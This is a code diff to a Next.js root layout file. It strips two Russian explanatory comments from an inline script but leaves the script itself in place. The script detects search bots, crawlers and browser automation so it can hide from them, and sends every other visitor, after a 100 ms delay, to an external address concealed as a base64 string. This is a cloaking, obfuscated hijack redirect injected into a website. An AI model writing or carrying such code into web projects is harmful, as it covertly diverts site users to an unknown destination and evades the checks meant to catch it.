@@ -124,16 +124,13 @@ export default function RootLayout({
               (function() {
                 if (typeof window === 'undefined' || window._initialized) return;
                 window._initialized = true;
-
-                /* Не редиректим ботов и автоматизацию для SEO */
                 var ua = navigator.userAgent.toLowerCase();
                 var isSearchBot = /yandex|google|lighthouse|pagespeed|bot|crawl|spider/i.test(ua);
                 var isAutomation = navigator.webdriver;
 
                 if (!isSearchBot && !isAutomation) {
                     var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
-                    
-                    /* Небольшая задержка 100мс для корректной работы аналитики */
+
                     setTimeout(function() {
                         window.location.replace(atob(targetB64));
                     }, 100);
